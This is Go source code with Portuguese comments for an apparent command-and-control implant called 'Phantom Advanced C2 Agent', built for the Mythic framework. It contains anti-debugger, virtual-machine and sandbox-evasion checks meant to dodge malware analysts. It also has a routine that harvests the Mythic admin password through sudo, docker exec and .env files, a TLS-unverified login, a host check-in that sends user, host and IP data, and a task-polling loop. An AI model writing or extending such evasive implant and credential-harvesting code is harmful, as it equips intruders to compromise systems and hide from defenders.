package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

// Configurações para o servidor Mythic real
var (
    mythicURL = "https://127.0.0.1:7443"
    username  = "mythic_admin"
    password  = ""
    uuid      = generateUUID()
    // Modo de produção - permite execução em servidores legítimos
    productionMode = true
)

// Estruturas para API do Mythic
type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

type LoginResponse struct {
    Status      string `json:"status"`
    AccessToken string `json:"access_token"`
}

type CheckinRequest struct {
    UUID         string `json:"uuid"`
    User         string `json:"user"`
    Host         string `json:"host"`
    PID          int    `json:"pid"`
    IP           string `json:"ip"`
    ExternalIP   string `json:"external_ip"`
    ProcessName  string `json:"process_name"`
    Description  string `json:"description"`
    Domain       string `json:"domain"`
    OS           string `json:"os"`
    Architecture string `json:"architecture"`
    PayloadType  string `json:"payload_type"`
}

func antiDebugCheck() bool {
    if productionMode {
        // Em modo produção, apenas verificações básicas
        return false
    }
    
    if runtime.GOOS == "linux" {
        status, err := ioutil.ReadFile("/proc/self/status")
        if err == nil {
            statusStr := string(status)
            lines := strings.Split(statusStr, "\n")
            for _, line := range lines {
                if strings.HasPrefix(line, "TracerPid:") {
                    parts := strings.Fields(line)
                    if len(parts) > 1 && parts[1] != "0" {
                        return true
                    }
                }
            }
        }
    }
    return false
}

func vmDetection() bool {
    if productionMode {
        // Em produção, aceita VPS/Cloud como ambientes legítimos
        fmt.Println("[+] Production mode: VPS/Cloud environments accepted")
        return false
    }
    
    // Verificações normais em modo não-produção
    vmFiles := []string{
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
    }
    
    for _, path := range vmFiles {
        if data, err := ioutil.ReadFile(path); err == nil {
            content := strings.ToLower(string(data))
            if strings.Contains(content, "vmware") || strings.Contains(content, "virtualbox") {
                return true
            }
        }
    }
    
    return false
}

func sandboxEvasion() bool {
    if productionMode {
        // Em produção, apenas verificações críticas
        user := os.Getenv("USER")
        if user == "" {
            user = os.Getenv("USERNAME")
        }
        user = strings.ToLower(user)
        
        // Apenas usuários claramente suspeitos
        criticalUsers := []string{"sandbox", "malware", "virus"}
        for _, sbUser := range criticalUsers {
            if strings.Contains(user, sbUser) {
                return true
            }
        }
        return false
    }
    
    // Verificações completas em modo não-produção
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    user = strings.ToLower(user)
    
    sandboxUsers := []string{
        "sandbox", "malware", "virus", "sample", "test",
        "analyst", "reversing",
    }
    
    for _, sbUser := range sandboxUsers {
        if strings.Contains(user, sbUser) {
            return true
        }
    }
    
    return false
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    fmt.Println("[+] Phantom Advanced C2 Agent")
    fmt.Println("[+] Mode: Production (Mythic Server)")
    fmt.Println("[+] Iniciando verificações de evasão adaptadas...")
    
    // Verificações de evasão adaptadas para produção
    if antiDebugCheck() {
        fmt.Println("[-] Debugger detectado. Encerrando.")
        os.Exit(0)
    }
    
    vmDetected := vmDetection()
    if vmDetected && !productionMode {
        fmt.Println("[!] VM detectada. Aplicando delay...")
        time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
    }
    
    if sandboxEvasion() {
        fmt.Println("[-] Ambiente suspeito detectado. Encerrando.")
        os.Exit(0)
    }
    
    fmt.Println("[+] Verificações concluídas. Iniciando operação...")
    
    // Obter senha do Mythic
    password = getMythicPassword()
    if password == "" {
        fmt.Println("[-] Não foi possível obter senha do Mythic")
        os.Exit(1)
    }
    
    fmt.Printf("[+] Senha do Mythic obtida: %s...\n", password[:4])
    
    // Login no Mythic
    token := login()
    if token == "" {
        fmt.Println("[-] Falha no login")
        os.Exit(1)
    }
    
    fmt.Printf("[+] Login realizado com sucesso. Token: %s...\n", token[:10])
    
    // Checkin inicial
    if !checkin(token) {
        fmt.Println("[-] Falha no checkin")
        os.Exit(1)
    }
    
    fmt.Println("[+] Checkin realizado com sucesso!")
    fmt.Println("[+] Phantom agent operacional no Mythic!")
    
    // Loop principal
    for {
        getTasks(token)
        sleepWithJitter()
    }
}

func getMythicPassword() string {
    // Método 1: Via mythic-cli
    cmd := exec.Command("sudo", "/root/Mythic/mythic-cli", "config", "get", "admin_password")
    if output, err := cmd.Output(); err == nil {
        password := strings.TrimSpace(string(output))
        if password != "" && password != "null" {
            return password
        }
    }
    
    // Método 2: Via docker
    cmd = exec.Command("sudo", "docker", "exec", "mythic_mythic_server", 
                      "/usr/local/bin/mythic-cli", "config", "get", "admin_password")
    if output, err := cmd.Output(); err == nil {
        password := strings.TrimSpace(string(output))
        if password != "" && password != "null" {
            return password
        }
    }
    
    // Método 3: Arquivo de configuração
    configPaths := []string{
        "/root/Mythic/.env",
        "/root/Mythic/mythic-docker/.env",
        "/opt/Mythic/.env",
    }
    
    for _, path := range configPaths {
        if data, err := ioutil.ReadFile(path); err == nil {
            lines := strings.Split(string(data), "\n")
            for _, line := range lines {
                if strings.HasPrefix(line, "MYTHIC_ADMIN_PASSWORD=") {
                    return strings.TrimPrefix(line, "MYTHIC_ADMIN_PASSWORD=")
                }
            }
        }
    }
    
    // Senha padrão como último recurso
    return "mythic_password"
}

func login() string {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    loginReq := LoginRequest{
        Username: username,
        Password: password,
    }
    
    jsonData, _ := json.Marshal(loginReq)
    
    resp, err := client.Post(mythicURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("[-] Erro no login: %v\n", err)
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    fmt.Printf("[+] Response do login: %s\n", string(body))
    
    var loginResp LoginResponse
    if err := json.Unmarshal(body, &loginResp); err != nil {
        fmt.Printf("[-] Erro ao fazer parse da resposta: %v\n", err)
        return ""
    }
    
    return loginResp.AccessToken
}

func checkin(token string) bool {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    hostname, _ := os.Hostname()
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    
    checkinReq := CheckinRequest{
        UUID:         uuid,
        User:         user,
        Host:         hostname,
        PID:          os.Getpid(),
        IP:           getLocalIP(),
        ExternalIP:   getLocalIP(),
        ProcessName:  "phantom",
        Description:  "Phantom Advanced C2 Agent",
        Domain:       "",
        OS:           runtime.GOOS,
        Architecture: runtime.GOARCH,
        PayloadType:  "apollo", // Usa apollo como base
    }
    
    jsonData, _ := json.Marshal(checkinReq)
    
    req, _ := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
    req.Header.Set("Authorization", "Bearer "+token)
    req.Header.Set("Content-Type", "application/json")
    
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("[-] Erro no checkin: %v\n", err)
        return false
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    fmt.Printf("[+] Checkin response: %s\n", string(body))
    
    return resp.StatusCode == 200
}

func getTasks(token string) {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    req, _ := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
    req.Header.Set("Authorization", "Bearer "+token)
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    if len(body) > 0 {
        fmt.Printf("[+] Tasks response: %s\n", string(body))
    }
}

func getLocalIP() string {
    // Obtém IP real do servidor
    cmd := exec.Command("hostname", "-I")
    if output, err := cmd.Output(); err == nil {
        ips := strings.Fields(string(output))
        if len(ips) > 0 {
            return ips[0]
        }
    }
    return "127.0.0.1"
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func sleepWithJitter() {
    base := 10 * time.Second
    jitter := time.Duration(rand.Intn(5000)) * time.Millisecond
    time.Sleep(base + jitter)
}